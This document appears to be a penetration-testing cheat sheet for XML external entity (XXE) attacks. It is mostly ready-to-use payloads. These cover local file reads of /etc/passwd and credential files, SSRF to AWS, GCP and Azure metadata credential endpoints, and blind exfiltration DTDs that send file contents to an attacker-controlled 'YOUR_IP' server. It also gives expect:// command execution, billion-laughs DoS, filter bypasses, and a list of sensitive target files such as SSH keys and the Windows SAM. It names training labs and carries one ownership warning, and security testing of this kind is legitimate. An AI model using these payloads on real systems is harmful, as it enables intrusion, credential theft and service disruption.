# XXE Hints & Cheat Sheet

Quick reference for XXE testing, payloads, and bypass techniques.

---

## Quick XXE Payloads

### Basic File Disclosure (Linux)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Basic File Disclosure (Windows)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<foo>&xxe;</foo>
```

### PHP Filter (Base64 Encode)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
]>
<foo>&xxe;</foo>
```

### SSRF - Internal Network

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:8080/">
]>
<foo>&xxe;</foo>
```

### SSRF - Cloud Metadata (AWS)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<foo>&xxe;</foo>
```

---

## Platform-Specific Payloads

### bWAPP

```xml
<!-- XXE in XML parser -->
<?xml version="1.0"?>
<!DOCTYPE user [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
  <name>&xxe;</name>
  <email>test@test.com</email>
</user>

<!-- Read bWAPP config -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
]>
<foo>&xxe;</foo>
```

### WebGoat

```xml
<!-- Basic XXE -->
<?xml version="1.0"?>
<!DOCTYPE comment [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<comment>
  <text>&xxe;</text>
</comment>

<!-- Blind XXE with external DTD -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_IP:8888/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

### Juice Shop

```xml
<!-- SVG file upload -->
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### Mutillidae

```xml
<!-- XML Validator -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

---

## Blind XXE Payloads

### External DTD Method

**Attacker's DTD (evil.dtd):**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP:8888/?data=%file;'>">
%eval;
%exfil;
```

**Payload:**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://YOUR_IP:8888/evil.dtd">
  %xxe;
]>
<foo>test</foo>
```

### Base64 Exfiltration DTD

```xml
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR_IP:8888/?data=%file;'>">
%eval;
%exfil;
```

### Error-Based DTD

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

---

## File Upload XXE

### Malicious SVG

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="14" x="0" y="16">&xxe;</text>
</svg>
```

### DOCX XXE Steps

```bash
# 1. Create normal DOCX
# 2. Extract
unzip document.docx -d extracted/

# 3. Edit [Content_Types].xml or word/document.xml
# Add XXE payload to XML declaration

# 4. Repack
cd extracted && zip -r ../malicious.docx *
```

### XLSX XXE

```bash
# Same process for Excel files
unzip spreadsheet.xlsx -d extracted/

# Edit xl/workbook.xml or [Content_Types].xml
# Add XXE payload

cd extracted && zip -r ../malicious.xlsx *
```

---

## Protocol Handlers

### File Protocol

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
```

### HTTP/HTTPS Protocol

```xml
<!ENTITY xxe SYSTEM "http://internal-server/">
<!ENTITY xxe SYSTEM "https://169.254.169.254/latest/meta-data/">
```

### PHP Wrappers

```xml
<!-- Base64 encode -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">

<!-- Read PHP source -->
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
```

### Expect Protocol (if enabled)

```xml
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "expect://whoami">
```

### Gopher Protocol

```xml
<!ENTITY xxe SYSTEM "gopher://127.0.0.1:25/xHELO%0aMAIL%20FROM...">
```

---

## Cloud Metadata Endpoints

### AWS

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/user-data">
```

### GCP

```xml
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/">
<!ENTITY xxe SYSTEM "http://169.254.169.254/computeMetadata/v1/">
```

### Azure

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
```

---

## DoS Payloads

### Billion Laughs (Use Carefully!)

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<lolz>&lol5;</lolz>
```

**Warning:** Only test on systems you own!

### Quadratic Blowup

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY a "AAAAA....(repeat thousands of times)....AAAAA">
]>
<foo>&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;</foo>
```

---

## Common Target Files

### Linux

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/proc/self/environ
/proc/self/cmdline
/proc/version
/home/user/.ssh/id_rsa
/home/user/.bash_history
/var/log/apache2/access.log
/var/log/auth.log
```

### Windows

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
```

### Application Files

```
/var/www/html/config.php
/var/www/html/.env
/opt/tomcat/conf/server.xml
/opt/tomcat/conf/tomcat-users.xml
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
```

---

## Detection Checklist

```
[ ] Identify XML input points (forms, APIs, file uploads)
[ ] Check Content-Type headers for XML
[ ] Look for XML-based file uploads (SVG, DOCX, XLSX)
[ ] Test basic external entity injection
[ ] Try different protocols (file, http, php)
[ ] Test for blind XXE with OOB server
[ ] Check error messages for file contents
[ ] Test parameter entities
[ ] Look for XML parsers in headers/cookies
```

---

## Quick Reference Tables

### Entity Types

| Type | Syntax | Use Case |
|------|--------|----------|
| Internal | `<!ENTITY name "value">` | Define inline content |
| External | `<!ENTITY name SYSTEM "uri">` | Reference external files |
| Parameter | `<!ENTITY % name "value">` | Used in DTD only |

### Common Protocols

| Protocol | Example | Purpose |
|----------|---------|---------|
| file:// | file:///etc/passwd | Read local files |
| http:// | http://internal/ | SSRF attacks |
| php:// | php://filter/... | PHP wrappers |
| expect:// | expect://id | Command exec |
| gopher:// | gopher://... | Protocol smuggling |

### XXE Types

| Type | Detection | Data Retrieval |
|------|-----------|----------------|
| In-band | Direct in response | Immediate |
| Blind/OOB | External HTTP request | Via attacker server |
| Error-based | Error messages | In error output |

---

## Troubleshooting

| Problem | Solution |
|---------|----------|
| No output | Try blind XXE with external DTD |
| XML parsing error | Check syntax, encoding |
| File not found | Try different paths, check permissions |
| Protocol not allowed | Try alternative protocols |
| Entity blocked | Use parameter entities |
| WAF blocking | Encode entities, use CDATA |
| Binary files fail | Use Base64 encoding via PHP filter |

---

## Bypass Techniques

### Encoding Bypass

```xml
<!-- URL encoding -->
<!ENTITY xxe SYSTEM "file:///etc%2fpasswd">

<!-- UTF-16 encoding -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- HTML entities -->
<!ENTITY xxe SYSTEM "file:///etc/pa&#x73;&#x73;wd">
```

### CDATA Wrapper

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % wrapper "<!ENTITY all '%start;%file;%end;'>">
```

### Local DTD Inclusion

```xml
<!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
  <!ENTITY % expr 'aaa)>
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    <!ELEMENT aa (bb'>
  %local_dtd;
]>
```

---

## OWASP References

- [OWASP XXE Prevention](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html)
- [OWASP XXE Attack](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)
- [OWASP Testing for XXE](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/07-Testing_for_XML_Injection)

## Additional Resources

- [PayloadsAllTheThings - XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)
- [PortSwigger XXE Labs](https://portswigger.net/web-security/xxe)
- [HackTricks - XXE](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)
